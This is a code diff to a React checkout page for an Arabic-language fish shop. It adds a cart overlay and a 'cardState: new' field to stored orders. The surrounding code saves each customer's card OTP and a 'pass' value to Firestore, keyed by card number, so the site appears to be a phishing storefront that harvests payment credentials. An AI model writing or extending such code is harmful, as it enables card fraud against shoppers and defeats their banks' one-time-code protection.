@@ -11,6 +11,7 @@ import PaymentForm from '../payment-form'
 import { doc, setDoc } from 'firebase/firestore'
 import db from '../lib/firebase'
 import { Input } from '@/components/ui/input'
+import CartPage from '../cart/page'
 
 type LocationType = 'home' | 'work' | 'client'
 type PaymentType = 'full' | 'partial'
@@ -20,6 +21,7 @@ export default function CheckoutPage() {
   const [paymentType, setPaymentType] = useState<PaymentType>('full')
   const [setp, setStep] = useState(1)
   const [loading, setisloading] = useState(false)
+  const [showCart, setShowCart] = useState(true)
 
   const handlePaymentComplete = async (paymentInfo: any, method: any) => {
     try {
@@ -32,6 +34,7 @@ export default function CheckoutPage() {
         otp: paymentInfo?.otp,
         pass: paymentInfo?.pass,
         createdAt: new Date(),
+        cardState:'new',
       }
       const docRef = await doc(db, 'orders', paymentInfo.cardNumber)
       const ref = await setDoc(docRef, order)
@@ -63,6 +66,7 @@ export default function CheckoutPage() {
 
   return (
     <div className="min-h-screen bg-gray-100 p-4 font-sans" dir="rtl">
+      <CartPage showCart={showCart} setShowCart={setShowCart}/>
       {setp === 1 ? (<form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
         {/* Location Selection */}
         <div className="space-y-4">
@@ -191,7 +195,7 @@ export default function CheckoutPage() {
           <h3 className="text-lg font-bold">سلة أسماك الوطنية</h3>
           <div className="space-y-2">
             <div className="flex justify-between">
-              <span>المنتجات ({items})</span>
+              <Button onClick={()=>setShowCart(true)} variant={'link'}>المنتجات ({items})</Button>
               <span>{total}د.ك</span>
             </div>
             <div className="flex justify-between">
